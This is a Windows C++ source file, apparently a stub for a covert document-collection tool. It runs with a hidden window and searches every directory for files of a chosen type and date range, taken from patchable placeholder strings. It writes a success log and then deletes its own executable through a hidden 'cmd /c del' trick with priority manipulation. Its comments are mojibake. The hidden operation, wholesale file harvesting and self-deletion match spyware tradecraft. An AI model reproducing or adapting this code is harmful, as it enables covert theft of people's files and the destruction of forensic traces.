// FileSearchAndCompress.cpp : ����Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "FileSearchAndCompress.h"
#include "CFile.h"
#include <shlwapi.h>
#include <shellapi.h>
#include <shlobj.h>

//#pragma comment  (lib,"shell32.lib")

#define MAX_LOADSTRING 100

// ȫ�ֱ���:
HINSTANCE hInst;								// ��ǰʵ��
TCHAR szTitle[MAX_LOADSTRING];					// �������ı�
TCHAR szWindowClass[MAX_LOADSTRING];			// ����������

char m_FileType[MAX_PATH]   = "!!!Type!!!";
char m_StartTime[MAX_PATH]  = "!!!StartTime!!!";
char m_EndTime[MAX_PATH]    = "!!!EndTime!!!";


// �˴���ģ���а����ĺ�����ǰ������:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

//��ɾ��
BOOL SelfDel();
//��ʱ���Ͷ�ʱ��
//void CALLBACK TimeProc(HWND hwnd,UINT message, UINT_PTR idTimer,DWORD dwTime);
//void  GetConfig();
int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO: �ڴ˷��ô��롣
	MSG msg;
	HACCEL hAccelTable;

	// ��ʼ��ȫ���ַ���
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_FILESEARCHANDCOMPRESS, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// ִ��Ӧ�ó����ʼ��:
	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_FILESEARCHANDCOMPRESS));

    //GetConfig();

	    //�ֽ�ת��
	TCHAR m_wFileType[MAX_PATH]   = {0};
    TCHAR m_wStartTime[MAX_PATH]  = {0};
    TCHAR m_wEndTime[MAX_PATH]    = {0};

	int len = MultiByteToWideChar(CP_ACP,0,m_FileType,strlen(m_FileType),NULL,0);  
    MultiByteToWideChar(CP_ACP,0,m_FileType,strlen(m_FileType),m_wFileType,len);  
    //m_wFileType[len]='\0';  
	
	len = MultiByteToWideChar(CP_ACP,0,m_StartTime,strlen(m_StartTime),NULL,0);  
    MultiByteToWideChar(CP_ACP,0,m_StartTime,strlen(m_StartTime),m_wStartTime,len);  
    //m_wStartTime[len]='\0';  
	
	len = MultiByteToWideChar(CP_ACP,0,m_EndTime,strlen(m_EndTime),NULL,0);  
    MultiByteToWideChar(CP_ACP,0,m_EndTime,strlen(m_EndTime),m_wEndTime,len);  
    //m_wEndTime[len]='\0';  

	//::MessageBox(NULL,m_wStartTime,_T("Tips"),MB_OK);
	//::MessageBox(NULL,m_wEndTime,_T("Tips"),MB_OK);
	//::MessageBox(NULL,m_wFileType,_T("Tips"),MB_OK);

	//��������ļ�
    CDFile* m_File = new CDFile();
	
    m_File->OnSearechFile(m_wFileType,_T(""),m_wStartTime,m_wEndTime,true); //ȫĿ¼

	//����
	//m_File->OnSearechFile(_T("doc"),_T(""),_T("2019-1-13"),_T("2019-12-13"),true);

	delete m_File;


    //���������־
	TCHAR   szConfig[MAX_PATH] = {0};
	TCHAR   szTemp[MAX_PATH] = {0};
	::GetModuleFileName(NULL, szConfig, MAX_PATH);
	int nPathLen = 0;

	for (int i = 0; i != MAX_PATH; i++)
	{
		if (!szConfig[i])
		{ break; }

		if (szConfig[i] == _T('\\'))
		{ nPathLen = i; }
	}
	szConfig[nPathLen] = _T('\0');

	SYSTEMTIME sysTime;
	::GetSystemTime(&sysTime);
	::_stprintf_s(szTemp, MAX_PATH, _T("\\Success%.2d%.2d%.2d%.2d.txt"), sysTime.wMonth, sysTime.wDay, sysTime.wHour, sysTime.wMinute);
    _tcscat_s(szConfig,MAX_PATH,szTemp);

	FILE *file = _tfopen(szConfig, _T("wb"));	
	fclose(file);


    Sleep(100);
	
	//��ɾ��
	SelfDel();


	exit(0);

	// ����Ϣѭ��:
	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int) msg.wParam;
}



//
//  ����: MyRegisterClass()
//
//  Ŀ��: ע�ᴰ���ࡣ
//
//  ע��:
//
//    ����ϣ��
//    �˴�������ӵ� Windows 95 �еġ�RegisterClassEx��
//    ����֮ǰ�� Win32 ϵͳ����ʱ������Ҫ�˺��������÷������ô˺���ʮ����Ҫ��
//    ����Ӧ�ó���Ϳ��Ի�ù�����
//    ����ʽ��ȷ�ġ�Сͼ�ꡣ
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_FILESEARCHANDCOMPRESS));
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= MAKEINTRESOURCE(IDC_FILESEARCHANDCOMPRESS);
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   ����: InitInstance(HINSTANCE, int)
//
//   Ŀ��: ����ʵ�����������������
//
//   ע��:
//
//        �ڴ˺����У�������ȫ�ֱ����б���ʵ�������
//        ��������ʾ�����򴰿ڡ�
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance; // ��ʵ������洢��ȫ�ֱ�����

   hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, SW_HIDE);
   UpdateWindow(hWnd);

    //���ö�ʱ��         
    //SetTimer(hWnd, 1, 1000 * 2, TimeProc);

   return TRUE;
}

//
//  ����: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  Ŀ��: ���������ڵ���Ϣ��
//
//  WM_COMMAND	- ����Ӧ�ó���˵�
//  WM_PAINT	- ����������
//  WM_DESTROY	- �����˳���Ϣ������
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;
   

	switch (message)
	{
	case WM_COMMAND:
		wmId    = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		// �����˵�ѡ��:
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		// TODO: �ڴ���������ͼ����...
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// �����ڡ������Ϣ�������
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}

//void  GetConfig()
//{
//	TCHAR   szConfig[MAX_PATH] = {0};
//	CString m_strConfig;
//	::GetModuleFileName(NULL, szConfig, MAX_PATH);
//	int nPathLen = 0;
//
//	for (int i = 0; i != MAX_PATH; i++)
//	{
//		if (!szConfig[i])
//			{ break; }
//
//		if (szConfig[i] == _T('\\'))
//			{ nPathLen = i; }
//	}
//
//	szConfig[nPathLen] = _T('\0');
//
//	m_strConfig = szConfig;
//	m_strConfig.Append(_T("\\FileConfig.ini"));
//
//
//	if (!::PathFileExists(m_strConfig)) {
//		return;
//	}
//
//	TCHAR* pRead = (TCHAR*)malloc(0x400);
//
//	ZeroMemory(pRead, 0x400);
//	GetPrivateProfileString(_T("Config"), _T("Type"), NULL, pRead, 0x400, m_strConfig);
//	_tcscpy_s(m_FileType,0x400,pRead);
//
//	ZeroMemory(pRead, 0x400);
//	GetPrivateProfileString(_T("Config"), _T("StartTime"), NULL, pRead, 0x400, m_strConfig);
//	_tcscpy_s(m_StartTime,0x400,pRead);
//
//	ZeroMemory(pRead, 0x400);
//	GetPrivateProfileString(_T("Config"), _T("EndTime"), NULL, pRead, 0x400, m_strConfig);
//	_tcscpy_s(m_EndTime,0x400,pRead);
//
//	//ZeroMemory(pRead, 0x400);
//	//GetPrivateProfileString(_T("Config"), _T("Path"), NULL, pRead, 0x400, m_strConfig);
//	//_tcscpy_s(m_FilePath,0x400,pRead);
//
//
//}

//���Ͷ�ʱ��
//void CALLBACK TimeProc(HWND hwnd,UINT message,UINT_PTR idTimer,DWORD dwTime)
//{
//	KillTimer(hwnd, 1);	
//}


BOOL SelfDel()
{

	SHELLEXECUTEINFO sei;

	TCHAR szModule [MAX_PATH],szComspec[MAX_PATH],szParams [MAX_PATH];

	// ��������ļ���. ��ȡcmd��ȫ·���ļ���

	if((GetModuleFileName(0,szModule,MAX_PATH)!=0) &&

		(GetShortPathName(szModule,szModule,MAX_PATH)!=0) &&

		(GetEnvironmentVariable(_T("COMSPEC"),szComspec,MAX_PATH)!=0))

	{

		// �����������.

		lstrcpy(szParams,_T("/c del "));

		lstrcat(szParams, szModule);

		lstrcat(szParams, _T(" > nul"));

		// ���ýṹ��Ա.

		sei.cbSize = sizeof(sei);

		sei.hwnd = 0;

		sei.lpVerb = _T("Open");

		sei.lpFile = szComspec;

		sei.lpParameters = szParams;

		sei.lpDirectory = 0; sei.nShow = SW_HIDE;

		sei.fMask = SEE_MASK_NOCLOSEPROCESS;

		// ����cmd����.

		if(ShellExecuteEx(&sei))

		{

			// ����cmd���̵�ִ�м���Ϊ����ִ��,ʹ���������㹻��ʱ����ڴ����˳�.

			SetPriorityClass(sei.hProcess,IDLE_PRIORITY_CLASS);

			// ��������̵����ȼ��ø�

			SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);

			SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);

			// ֪ͨWindows��Դ�����,�������ļ��Ѿ���ɾ��.

			SHChangeNotify(SHCNE_DELETE,SHCNF_PATH,szModule,0);

			return TRUE;

		}

		return FALSE;
	}

	return FALSE;
}
